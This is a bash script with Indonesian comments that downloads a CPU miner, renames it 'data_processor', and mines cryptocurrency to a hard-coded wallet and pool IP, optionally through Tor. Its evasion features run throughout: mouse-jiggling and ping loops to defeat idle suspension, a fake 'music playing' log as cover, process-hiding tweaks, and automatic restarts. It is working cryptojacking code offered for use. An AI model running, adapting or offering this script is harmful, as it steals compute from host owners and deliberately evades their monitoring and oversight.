#!/bin/bash
set -euo pipefail

LOGFILE="anti_dismiss_noroot.log"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

FAKE_NAME="data_processor"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://104.248.150.108:9933"
ALGO="power2b"
THREADS=$(nproc)

USE_SOCKS5=false
TOR_CMD=""
if command -v torsocks >/dev/null 2>&1; then
    USE_SOCKS5=true
    TOR_CMD="torsocks"
    echo "[*] Using SOCKS5 via torsocks" | tee -a "$LOGFILE"
fi

# Unduh dan ekstrak miner jika belum ada
if [ ! -f "$FAKE_NAME" ]; then
    echo "[*] Downloading miner @$(date)" | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    if [ ! -f cpuminer-sse2 ]; then
        echo "[!] Miner binary not found after extraction." | tee -a "$LOGFILE"
        exit 1
    fi
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

# Anti suspend otomatis (xdotool jika ada, ping jika tidak)
anti_suspend_auto() {
    if command -v xdotool >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then
        echo "[*] Using xdotool for anti-suspend" | tee -a "$LOGFILE"
        while true; do
            xdotool mousemove_relative -- 1 1
            sleep 1
            xdotool mousemove_relative -- -1 -1
            sleep 58
        done
    else
        echo "[*] xdotool not available or DISPLAY unset. Using ping fallback." | tee -a "$LOGFILE"
        while true; do
            ping -c1 127.0.0.1 >/dev/null
            sleep 57
        done
    fi
}

# Simulasi pemutaran musik palsu
fake_music_stream() {
    local songs=("lofi chill beat" "jazzy sunset" "ambient rain" "coffee shop music" "vaporwave vibes")
    while true; do
        SONG="${songs[$RANDOM % ${#songs[@]}]}"
        echo "[*] Playing: $SONG - $(date)" >> "$LOGFILE"
        curl -s --max-time 5 https://example.com/fake_music.mp3 -o /dev/null || true
        sleep 30
    done
}

# Anti idle
keep_alive() {
    while true; do
        echo "[*] Heartbeat $(date)" >> "$LOGFILE"
        (ping -c1 127.0.0.1 >/dev/null 2>&1 &) 
        (ls /proc >/dev/null 2>&1 &)  
        sleep 57
    done
}

# Sembunyikan proses
hide_process() {
    echo 0 > /proc/$$/oom_score_adj 2>/dev/null || true
    renice -n 19 -p $$ > /dev/null 2>&1 || true
}

run_miner() {
    anti_suspend_auto &
    ASPID=$!
    hide_process

    while true; do
        echo "[*] Mining start @$(date)" >> "$LOGFILE"
        $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
        PID=$!

        keep_alive &
        KPID=$!

        fake_music_stream &
        FPID=$!

        while sleep 25; do
            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crash. Restarting @$(date)" >> "$LOGFILE"
                kill $KPID $FPID $ASPID 2>/dev/null || true
                sleep 3
                break
            fi
        done
    done
}

run_miner
